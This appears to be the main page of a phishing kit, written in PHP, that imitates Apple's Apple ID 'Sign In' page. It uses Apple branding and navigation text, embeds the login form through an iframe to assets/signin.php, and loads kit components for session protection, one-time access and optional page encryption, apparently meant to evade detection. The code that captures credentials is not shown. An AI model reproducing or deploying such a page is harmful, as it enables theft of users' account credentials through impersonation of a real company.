<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "CONTROLS.php";
require "assets/includes/bahasa.php";
if($EncryptScript == 1) {
require "assets/includes/enc.php";
encryptPage();
}
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title>Sign In</title>
<link rel="icon" href="assets/img/favicon.ico" type="image/x-icon" />
<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon" />
</head>
<body id="pagecontent">
<div id="content">
<div class="bdd45">
<?php include("assets/nav.php"); ?>
<div class="subnav">
<div class="container">
<div class="title pull-left" style="font-weight: 500;font-size: 26px;">Apple&nbsp;ID</div>
<div class="menu-wrapper pull-right">
<ul class="menu">
<li class="item active"><a class="btn btn-link btn-signin" href="#"><?php echo $bhs['login1']; ?></a></li>
<li class="item"><a class="btn btn-link btn-create" href="#"><?php echo $bhs['login2']; ?></a></li>
<li class="item"><a class="btn btn-link btn-faq" href="#"><?php echo $bhs['login3']; ?></a></li>
</ul>
</div>
</div>
</div>
<div class="paws signin">
<h1 class="LoginTitle">Apple&nbsp;ID</h1>
<div class="LoginIframe" id="auth-container" style="position: relative;">
<iframe width="100%" height="100%" name="login" id="login" src="assets/signin.php" frameborder="0" scrolling="no"></iframe>
</div>
</div>
<div id="flow">
<div class="flow-body signin clearfix" role="main">
<div class="container">
<div class="forgot" id="forgot-link"><a href="#"><?php echo $bhs['login4']; ?></a></div>
<div class="flex home-content">
<h2 id="Title" class="title separator" style="font-weight: 500;"><?php echo $bhs['login5']; ?></h2>
<div id="TitleMsg" class="intro" style="max-width: 400px;margin: auto;"><?php echo $bhs['login6']; ?><a class="button faq-link" href="#"><?php echo $bhs['login7']; ?><i class="icon Righty"></i></a></div>
<div id="AppIconsWrapper" class="apps text-center"><img class="ApplicationIcons" src="assets/img/icons.jpg" height="68" width="656"></div>
<div id="CreateAccount" class="intro create show"><a class="button create-link" href="#"><?php echo $bhs['login2']; ?><i class="icon Righty"></i></a></div>
</div>
</div>
</div>
</div>
<link href="assets/css/First.css" media="all" rel="stylesheet" type="text/css">
<link href="assets/css/Second.css" rel="stylesheet" type="text/css">
<link href="assets/css/Fonts.css" rel="stylesheet" type="text/css">
<?php
require "assets/includes/language.php";
include("assets/footer.php");
?>
</div>
</div>
</body>
</html>